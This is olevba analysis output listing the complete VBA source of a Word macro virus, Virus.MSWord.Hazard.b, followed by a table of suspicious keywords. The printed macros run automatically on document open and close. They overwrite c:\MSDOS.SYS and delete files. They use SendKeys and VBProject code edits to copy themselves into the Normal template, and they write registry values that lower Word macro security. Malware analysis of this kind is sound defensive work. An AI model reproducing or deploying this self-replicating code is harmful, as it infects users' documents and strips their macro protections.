olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hazard.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hazard.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ®.bas 
in file: Virus.MSWord.Hazard.b - OLE stream: 'Macros/VBA/®'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
























































Private Sub MathraSpenta()
On Error Resume Next
SendKeys "%{F11}"
SendKeys "^m"
SendKeys "c:\MSDOS.SYS"
SendKeys "%o"
SendKeys "^e"
SendKeys "c:\®"
SendKeys "%s"
SendKeys "%{F4}"
End Sub
Sub autoclose()
Call DamoishUpamana
Call AshaVahishta
End Sub
Private Sub DahmaAfriti()
On Error Resume Next
Kill "c:\®.bas"
Kill "c:\®.cls"
Call AshiVanghuhi
With NormalTemplate
With .VBProject
With .VBComponents
With .Item("®")
.Export "c:\MSDOS.SYS"
End With
End With
End With
End With
ActiveDocument.Save
Call GeushUrvan
End Sub
Private Sub RashnuRazishta()
On Error Resume Next
With NormalTemplate
With .VBProject
With .VBComponents
'ashi vanghuhi
End With
End With
End With
With Application
.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:="®1", _
Object:=3
End With
Call DahmaAfriti
End Sub
Sub autoopen()
On Error Resume Next
Kill "c:\®.bas"
Call VohuMano
Call MathraSpenta
End Sub
Private Sub VohuMano()
On Error Resume Next
If Dir("c:\MSDOS.SYS") = "MSDOS.SYS" Then GoTo XshatraVairya
SetAttr ("c:\MSDOS.SYS"), vbNormal
Kill "c:\MSDOS.SYS"
Open "c:\MSDOS.SYS" For Output As #1
Print #1, "Attribute VB_Name = ""™"""
Print #1, "Private Sub Mathra()"
Print #1, "'yatha ahu vairyo"
Print #1, "'atha ratush ashatcit haca"
Print #1, "'vangheush dazda manangho"
Print #1, "'shyaothananam angheush mazdai"
Print #1, "'xshatremca ahurai a"
Print #1, "'yim drigubyo dadat vastarem"
Print #1, "End Sub"
Close #1
XshatraVairya:
End Sub
Private Sub AshaVahishta()
On Error Resume Next
With ActiveDocument
With .VBProject
With .VBComponents("®")
With .CodeModule
.ReplaceLine 94, ".Import ""c:\®.bas"""
End With
End With
End With
End With
Call RashnuRazishta
End Sub
Private Sub AshiVanghuhi()
On Error Resume Next
With ActiveDocument
With .VBProject
With .VBComponents("®")
With .CodeModule
.ReplaceLine 94, "'ashi vanghuhi"
End With
End With
End With
End With
End Sub
Private Sub DamoishUpamana()
On Error Resume Next
With Application
.OrganizerDelete Source:=Word.ActiveDocument.FullName, _
Name:="™", _
Object:=3
.OrganizerDelete Source:=Word.ActiveDocument.FullName, _
Name:="®1", _
Object:=3
End With
End Sub
Sub toolsmacro()
'it is another way...
End Sub
Sub viewvbcode()
'pathology, but nice pathology
End Sub
Sub viewsecurity()
'ushta!
End Sub
Private Sub GeushUrvan()
On Error Resume Next
With System
.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Security", "Level") = 1&
.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

